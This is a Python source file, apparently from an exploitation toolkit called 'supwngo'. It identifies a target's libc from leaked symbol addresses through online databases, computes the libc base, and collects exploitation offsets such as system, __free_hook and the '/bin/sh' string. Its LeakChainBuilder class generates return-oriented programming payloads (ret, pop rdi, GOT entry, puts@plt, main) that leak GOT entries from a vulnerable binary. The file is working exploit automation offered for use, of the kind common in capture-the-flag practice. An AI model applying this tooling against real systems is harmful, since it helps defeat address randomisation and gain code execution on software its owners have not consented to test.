"""
Libc Offset Automation Module.

Provides automated libc identification and offset calculation:
- Multi-symbol leak handling
- Libc matching with confidence scoring
- Offset verification
- Fallback strategies
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple
from pathlib import Path
import subprocess
import re

from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class LibcMatch:
    """A potential libc match."""
    id: str
    version: str
    symbols: Dict[str, int]  # symbol -> offset
    download_url: Optional[str] = None
    confidence: float = 0.0
    local_path: Optional[str] = None

    def get_offset(self, symbol: str) -> Optional[int]:
        """Get offset for a symbol."""
        return self.symbols.get(symbol)

    def __str__(self) -> str:
        return f"{self.id} ({self.version}) - confidence: {self.confidence:.0%}"


@dataclass
class LibcAnalysis:
    """Complete libc analysis result."""
    leaked_symbols: Dict[str, int]  # symbol -> leaked address
    matches: List[LibcMatch]
    best_match: Optional[LibcMatch] = None
    base_address: Optional[int] = None
    verified: bool = False
    notes: List[str] = field(default_factory=list)

    def get_symbol_address(self, symbol: str) -> Optional[int]:
        """Calculate symbol address from base + offset."""
        if self.base_address is None or self.best_match is None:
            return None
        offset = self.best_match.get_offset(symbol)
        if offset is None:
            return None
        return self.base_address + offset

    def summary(self) -> str:
        """Get analysis summary."""
        lines = [
            f"Leaked symbols: {len(self.leaked_symbols)}",
            f"Matches found: {len(self.matches)}",
        ]
        if self.best_match:
            lines.append(f"Best match: {self.best_match}")
        if self.base_address:
            lines.append(f"Libc base: {hex(self.base_address)}")
        if self.verified:
            lines.append("Verification: PASSED")
        return "\n".join(lines)


class LibcAutomation:
    """
    Automated libc identification and offset calculation.

    Features:
    - Query multiple libc databases
    - Score matches by symbol accuracy
    - Calculate base address from any leak
    - Verify offsets before exploitation
    """

    # Known libc databases
    DATABASES = [
        "https://libc.rip",
        "https://libc.blukat.me",
    ]

    # Common symbols to leak for identification
    GOOD_LEAK_SYMBOLS = [
        'puts', 'printf', 'write', 'read', 'system',
        '__libc_start_main', 'setvbuf', 'setbuf',
        'fgets', 'gets', 'strlen', 'strcmp',
        'malloc', 'free', 'exit', 'atoi',
    ]

    # Useful symbols for exploitation
    EXPLOIT_SYMBOLS = [
        'system', 'execve', 'execl', 'execvp',
        '__libc_system', '__libc_dlopen_mode',
        '__free_hook', '__malloc_hook', '__realloc_hook',
        '__libc_argv', 'environ', '__environ',
        '/bin/sh', 'str_bin_sh',
    ]

    def __init__(self, local_libc: Optional[str] = None):
        """
        Initialize libc automation.

        Args:
            local_libc: Path to local libc for direct analysis
        """
        self.local_libc = Path(local_libc) if local_libc else None
        self._symbol_cache: Dict[str, Dict[str, int]] = {}

    def identify(
        self,
        leaked_symbols: Dict[str, int],
        verify: bool = True,
    ) -> LibcAnalysis:
        """
        Identify libc from leaked symbol addresses.

        Args:
            leaked_symbols: Dict of symbol_name -> leaked_address
            verify: Whether to verify the match

        Returns:
            LibcAnalysis with matches and calculated base
        """
        analysis = LibcAnalysis(
            leaked_symbols=leaked_symbols,
            matches=[],
        )

        # Extract low 12 bits (page offset) for matching
        search_symbols = {}
        for sym, addr in leaked_symbols.items():
            search_symbols[sym] = addr & 0xFFF

        # Try local libc first
        if self.local_libc and self.local_libc.exists():
            match = self._check_local_libc(leaked_symbols)
            if match:
                analysis.matches.append(match)
                analysis.notes.append("Matched against local libc")

        # Query online databases
        online_matches = self._query_databases(search_symbols)
        analysis.matches.extend(online_matches)

        # Score and rank matches
        self._score_matches(analysis)

        # Select best match
        if analysis.matches:
            analysis.best_match = max(analysis.matches, key=lambda m: m.confidence)

            # Calculate base address
            analysis.base_address = self._calculate_base(
                leaked_symbols, analysis.best_match
            )

            # Verify if requested
            if verify and len(leaked_symbols) >= 2:
                analysis.verified = self._verify_match(
                    leaked_symbols, analysis.best_match, analysis.base_address
                )
                if not analysis.verified:
                    analysis.notes.append("WARNING: Verification failed")

        return analysis

    def _check_local_libc(self, leaked_symbols: Dict[str, int]) -> Optional[LibcMatch]:
        """Check leaked addresses against local libc."""
        try:
            from pwn import ELF
            libc = ELF(str(self.local_libc), checksec=False)
        except ImportError:
            return self._check_local_libc_nm(leaked_symbols)

        symbols = {}
        for sym in self.GOOD_LEAK_SYMBOLS + self.EXPLOIT_SYMBOLS:
            if sym in libc.symbols:
                symbols[sym] = libc.symbols[sym]

        # Check if low 12 bits match
        matches = 0
        for sym, addr in leaked_symbols.items():
            if sym in symbols:
                if (addr & 0xFFF) == (symbols[sym] & 0xFFF):
                    matches += 1

        if matches == len(leaked_symbols):
            # Get version string
            try:
                strings_output = subprocess.run(
                    ['strings', str(self.local_libc)],
                    capture_output=True, text=True, timeout=10
                )
                version = "unknown"
                for line in strings_output.stdout.split('\n'):
                    if 'glibc' in line.lower() or 'gnu c library' in line.lower():
                        version = line.strip()[:50]
                        break
            except:
                version = "local"

            return LibcMatch(
                id="local",
                version=version,
                symbols=symbols,
                confidence=1.0,
                local_path=str(self.local_libc),
            )

        return None

    def _check_local_libc_nm(self, leaked_symbols: Dict[str, int]) -> Optional[LibcMatch]:
        """Check local libc using nm command."""
        try:
            result = subprocess.run(
                ['nm', '-D', str(self.local_libc)],
                capture_output=True, text=True, timeout=10
            )

            symbols = {}
            for line in result.stdout.split('\n'):
                parts = line.split()
                if len(parts) >= 3:
                    addr_str, sym_type, name = parts[0], parts[1], parts[2]
                    try:
                        symbols[name] = int(addr_str, 16)
                    except ValueError:
                        continue

            # Check matches
            matches = 0
            for sym, addr in leaked_symbols.items():
                if sym in symbols:
                    if (addr & 0xFFF) == (symbols[sym] & 0xFFF):
                        matches += 1

            if matches == len(leaked_symbols):
                return LibcMatch(
                    id="local",
                    version="local",
                    symbols=symbols,
                    confidence=1.0,
                    local_path=str(self.local_libc),
                )

        except Exception as e:
            logger.debug(f"nm check failed: {e}")

        return None

    def _query_databases(self, search_symbols: Dict[str, int]) -> List[LibcMatch]:
        """Query online libc databases."""
        matches = []

        # Try libc.rip API
        try:
            import requests

            # Build query
            symbols_query = {sym: hex(offset) for sym, offset in search_symbols.items()}

            response = requests.post(
                "https://libc.rip/api/find",
                json={"symbols": symbols_query},
                timeout=10,
            )

            if response.status_code == 200:
                results = response.json()
                for result in results:
                    match = LibcMatch(
                        id=result.get('id', 'unknown'),
                        version=result.get('id', 'unknown'),
                        symbols=result.get('symbols', {}),
                        download_url=result.get('download_url'),
                        confidence=0.8,  # Base confidence for online match
                    )
                    matches.append(match)

        except Exception as e:
            logger.debug(f"libc.rip query failed: {e}")

        return matches

    def _score_matches(self, analysis: LibcAnalysis) -> None:
        """Score matches by accuracy."""
        for match in analysis.matches:
            score = 0.0
            total_checks = 0

            for sym, leaked_addr in analysis.leaked_symbols.items():
                if sym in match.symbols:
                    # Check low 12 bits match
                    if (leaked_addr & 0xFFF) == (match.symbols[sym] & 0xFFF):
                        score += 1.0
                    total_checks += 1

            if total_checks > 0:
                match.confidence = score / total_checks

                # Bonus for matching more symbols
                if total_checks >= 3:
                    match.confidence = min(1.0, match.confidence + 0.1)

    def _calculate_base(
        self,
        leaked_symbols: Dict[str, int],
        match: LibcMatch,
    ) -> Optional[int]:
        """Calculate libc base address from leaked symbols."""
        bases = []

        for sym, leaked_addr in leaked_symbols.items():
            if sym in match.symbols:
                offset = match.symbols[sym]
                base = leaked_addr - offset
                bases.append(base)

        if not bases:
            return None

        # All bases should be the same
        base = bases[0]

        # Verify alignment (libc base is page-aligned)
        if base & 0xFFF != 0:
            # Adjust to page boundary
            base = base & ~0xFFF

        return base

    def _verify_match(
        self,
        leaked_symbols: Dict[str, int],
        match: LibcMatch,
        base: int,
    ) -> bool:
        """Verify match by checking all symbols."""
        for sym, leaked_addr in leaked_symbols.items():
            if sym in match.symbols:
                expected = base + match.symbols[sym]
                if expected != leaked_addr:
                    return False
        return True

    def get_useful_offsets(self, match: LibcMatch) -> Dict[str, int]:
        """Get commonly needed offsets from a match."""
        useful = {}

        for sym in self.EXPLOIT_SYMBOLS:
            if sym in match.symbols:
                useful[sym] = match.symbols[sym]

        # Try to find /bin/sh string offset
        if match.local_path:
            binsh = self._find_binsh_offset(match.local_path)
            if binsh:
                useful['/bin/sh'] = binsh

        return useful

    def _find_binsh_offset(self, libc_path: str) -> Optional[int]:
        """Find /bin/sh string offset in libc."""
        try:
            from pwn import ELF
            libc = ELF(libc_path, checksec=False)
            offset = next(libc.search(b'/bin/sh'), None)
            return offset
        except:
            pass

        # Fallback: use strings
        try:
            result = subprocess.run(
                ['strings', '-t', 'x', libc_path],
                capture_output=True, text=True, timeout=10
            )
            for line in result.stdout.split('\n'):
                if '/bin/sh' in line:
                    parts = line.strip().split()
                    if parts:
                        return int(parts[0], 16)
        except:
            pass

        return None

    def download_libc(self, match: LibcMatch, output_dir: str = ".") -> Optional[str]:
        """Download libc from match."""
        if not match.download_url:
            return None

        try:
            import requests

            response = requests.get(match.download_url, timeout=30)
            if response.status_code == 200:
                output_path = Path(output_dir) / f"libc_{match.id}.so"
                output_path.write_bytes(response.content)
                match.local_path = str(output_path)
                return str(output_path)

        except Exception as e:
            logger.error(f"Failed to download libc: {e}")

        return None


class LeakChainBuilder:
    """
    Builds multi-step leak chains for libc identification.

    Generates payloads to leak multiple symbols for better
    libc identification accuracy.
    """

    def __init__(self, binary_path: str, bits: int = 64):
        """
        Initialize leak chain builder.

        Args:
            binary_path: Path to target binary
            bits: Architecture bits
        """
        self.binary_path = Path(binary_path)
        self.bits = bits
        self.word_size = bits // 8

    def build_got_leak_chain(
        self,
        puts_plt: int,
        pop_rdi: int,
        ret: int,
        got_entries: Dict[str, int],
        main_addr: int,
    ) -> List[bytes]:
        """
        Build a chain to leak multiple GOT entries.

        Args:
            puts_plt: Address of puts@plt
            pop_rdi: pop rdi; ret gadget
            ret: ret gadget for alignment
            got_entries: Dict of symbol -> GOT address
            main_addr: Address to return to for more leaks

        Returns:
            List of payload bytes (one per leak)
        """
        try:
            from pwn import p64, p32
            pack = p64 if self.bits == 64 else p32
        except ImportError:
            def pack(x):
                return x.to_bytes(self.word_size, 'little')

        payloads = []

        # Prioritize good symbols for identification
        priority_symbols = ['puts', 'printf', 'write', '__libc_start_main', 'setvbuf']

        for sym in priority_symbols:
            if sym in got_entries:
                # Build leak payload
                payload = b''
                if self.bits == 64:
                    payload += pack(ret)  # Stack alignment
                payload += pack(pop_rdi)
                payload += pack(got_entries[sym])
                payload += pack(puts_plt)
                payload += pack(main_addr)  # Return to main for more leaks

                payloads.append((sym, payload))

        return payloads

    def parse_leak(self, output: bytes) -> Optional[int]:
        """
        Parse a leaked address from binary output.

        Args:
            output: Raw output from binary

        Returns:
            Leaked address or None
        """
        # Strip common suffixes
        output = output.strip()

        # Handle null bytes (common in libc addresses)
        if len(output) < self.word_size:
            output = output + b'\x00' * (self.word_size - len(output))

        try:
            if self.bits == 64:
                # Take first 8 bytes, handle short reads
                leak_bytes = output[:8]
                if len(leak_bytes) < 8:
                    leak_bytes = leak_bytes + b'\x00' * (8 - len(leak_bytes))
                addr = int.from_bytes(leak_bytes, 'little')

                # Validate address range
                if 0x7f0000000000 <= addr <= 0x7fffffffffff:
                    return addr
            else:
                leak_bytes = output[:4]
                if len(leak_bytes) < 4:
                    leak_bytes = leak_bytes + b'\x00' * (4 - len(leak_bytes))
                addr = int.from_bytes(leak_bytes, 'little')

                if 0xf0000000 <= addr <= 0xffffffff:
                    return addr

        except Exception:
            pass

        return None


def identify_libc(
    leaked_symbols: Dict[str, int],
    local_libc: str = None,
) -> LibcAnalysis:
    """
    Convenience function to identify libc.

    Args:
        leaked_symbols: Dict of symbol_name -> leaked_address
        local_libc: Optional path to local libc

    Returns:
        LibcAnalysis result
    """
    auto = LibcAutomation(local_libc)
    return auto.identify(leaked_symbols)
